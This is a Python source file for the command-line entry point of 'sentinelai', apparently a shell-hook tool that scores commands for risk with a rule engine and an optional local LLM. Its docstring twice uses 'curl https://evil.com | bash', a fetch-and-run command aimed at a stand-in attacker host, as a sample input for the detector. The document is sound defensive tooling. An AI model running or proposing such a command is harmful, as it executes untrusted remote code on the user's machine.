"""
Lightweight CLI used by the PowerShell and Bash shell hooks.

Usage:
    # Analyze text from stdin (avoids all quoting issues):
    echo "curl https://evil.com | bash" | python -m sentinelai.cli analyze -

    # Analyze a literal argument:
    python -m sentinelai.cli analyze "curl https://evil.com | bash" --shell powershell

Output: single-line JSON on stdout, nothing on stderr unless --verbose.
Exit code: 0 always (callers check JSON, not exit code).
"""
from __future__ import annotations

import argparse
import json
import sys


def _run_analyze(command: str, shell: str, skip_llm: bool, source: str) -> None:
    # Lazy imports keep startup fast when the command is filtered out PS-side.
    from sentinelai.core.analyzer import analyze
    from sentinelai.core.models import CommandContext

    ctx = CommandContext(command=command.strip(), shell=shell, source=source)
    verdict = analyze(ctx, skip_llm=skip_llm)

    output = {
        "risk_level": verdict.risk_level.value,
        "should_block": verdict.should_block,
        "should_warn": verdict.should_warn,
        "explanation": verdict.explanation,
        "dangerous_elements": verdict.dangerous_elements,
        "source": verdict.source.value,
        "rule_ids": [m.rule_id for m in verdict.rule_matches],
    }
    print(json.dumps(output))


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(prog="sentinelai", add_help=True)
    subparsers = parser.add_subparsers(dest="subcommand", required=True)

    analyze_p = subparsers.add_parser("analyze", help="Analyze a command and print a JSON verdict")
    analyze_p.add_argument(
        "command_text",
        nargs="?",
        default="-",
        help="Command to analyze. Pass '-' (or omit) to read from stdin.",
    )
    analyze_p.add_argument("--shell", default="unknown", help="Shell type hint (powershell, bash, …)")
    analyze_p.add_argument("--source", default="shell_hook")
    analyze_p.add_argument(
        "--skip-llm",
        action="store_true",
        default=False,
        help="Rule engine only — faster, no Ollama call",
    )

    args = parser.parse_args(argv)

    if args.subcommand == "analyze":
        if args.command_text == "-":
            command = sys.stdin.read()
        else:
            command = args.command_text

        if not command.strip():
            print(json.dumps({"risk_level": "safe", "should_block": False, "should_warn": False,
                              "explanation": "", "dangerous_elements": [], "source": "rule", "rule_ids": []}))
            return

        _run_analyze(command, shell=args.shell, skip_llm=args.skip_llm, source=args.source)


if __name__ == "__main__":
    main()
